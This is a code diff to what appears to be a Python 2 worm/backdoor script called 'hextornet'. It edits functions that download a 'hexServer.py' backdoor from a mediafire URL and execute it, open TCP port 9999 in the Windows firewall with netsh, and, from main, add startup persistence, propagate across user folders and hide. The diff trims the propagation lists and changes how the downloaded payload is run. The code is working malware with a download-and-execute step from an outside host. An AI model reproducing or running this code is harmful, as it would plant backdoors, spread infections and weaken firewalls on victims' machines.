@@ -13,8 +13,8 @@ src = os.path.abspath('hextornet.py')
 usr = getpass.getuser()
 URL = 'http://download1081.mediafire.com/baue0t5ua4mg/4v19d8b5jd2b7jj/hexServer.py'
 
-hextornet   = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
-directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
+hextornet   = ['winHex']#, Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
+directories = ['Documents']#, 'Downloads', 'Music', 'Pictures', 'Videos']
 hexDir = zip(directories, hextornet)
 localization = []
 dst = ""
@@ -108,11 +108,13 @@ def downloadBackDoor(url, path):
         outfile = open(filename, "wb")
         outfile.write(content)
         outfile.close()
-        source= os.path.abspath(filename)
+        source= os.path.join(path)
+	print'[MOVE] ',source,'[TO] ',path
         shutil.move(source, path)
         print'\t[DOWNLOAD IN]',os.path.abspath(filename)
+	print'\t[DOWNLOAD DONE]', filename
+	print'\t[RUNNING]',os.path.abspath(filename)
         run(os.path.abspath(filename))
-        print'\t[DOWNLOAD DONE]', src
 
 
 def runWorms():
@@ -121,32 +123,27 @@ def runWorms():
 
 
 def run(program):
-        print'[RUN HEXTORNET]',program
+        print'[RUN]',program
         try:
-                process = subprocess.Popen(program, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-                process.wait()
+                process = subprocess.Popen("python "+str(program), shell=True)
+		process.wait()
         except Exception as e:
-                return '[!]'+str(e)
+                return '[NOT RUN!!]'+str(e)
 
 
 def openPort(port):
-        os.system('netsh firewall add portopening protocol = TCP port = '+port+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
-
-def delete_func(func):
-	del globals()[func.func_name]
+        os.system('netsh firewall add portopening protocol = TCP port = '+str(port)+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
 
 def main():
         if windows_client():
 		validate()
                 addStartup()
                 propagate()
-                runWorms()
 		openPort(9999)
 		hide()
         elif linux_client():
 		propagate()
 		validate()
-		runWorms()
 
 
 if __name__ == "__main__":
